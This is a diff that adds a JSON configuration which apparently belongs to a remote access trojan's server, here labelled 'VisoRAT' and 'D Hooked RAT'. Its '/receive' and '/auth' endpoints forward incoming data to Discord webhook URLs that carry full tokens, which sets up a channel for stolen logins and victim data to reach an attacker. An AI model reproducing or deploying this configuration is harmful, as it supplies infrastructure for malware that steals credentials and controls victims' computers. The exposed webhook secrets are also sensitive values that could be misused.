@@ -1,1 +1,38 @@
-nice guy
+{
+    "security": {
+        "rate_limit_seconds": 600,
+        "min_token_length": 128,
+        "check_duplicate_tokens": true
+    },
+    "endpoints": {
+        "/receive": {
+            "webhooks": [
+                {
+                    "url": "https://discord.com/api/webhooks/1522188038061555823/R2k6Cwv0OjaHTVUfF20vOcDI_rLrh3m-93F8F2NnY63ARIfKTZNERtF9Hfb5oR1EjaKS",
+                    "name": "D Hooked RAT",
+                    "footer": "VisoRAT",
+                    "color": 7414964,
+					"avatar_url": "https://bigrat.monster/media/bigrat.jpg"
+                },
+                {
+                    "url": "https://discord.com/api/webhooks/1522188038061555823/R2k6Cwv0OjaHTVUfF20vOcDI_rLrh3m-93F8F2NnY63ARIfKTZNERtF9Hfb5oR1EjaKS", 
+                    "name": "RAT",
+                    "footer": "VisoRAT",
+                    "color": 7414964,
+					"avatar_url": "https://bigrat.monster/media/bigrat.jpg"
+                }
+            ]
+        },
+        "/auth": {
+            "webhooks": [
+                {
+                    "url": "https://discord.com/api/webhooks/1522188038061555823/R2k6Cwv0OjaHTVUfF20vOcDI_rLrh3m-93F8F2NnY63ARIfKTZNERtF9Hfb5oR1EjaKS",
+                    "name": "Not D Hooked RAT",
+                    "footer": "VisoRAT",
+                    "color": 7414964,
+					"avatar_url": "https://bigrat.monster/media/bigrat.jpg"
+                }
+            ]
+        }
+    }
+}
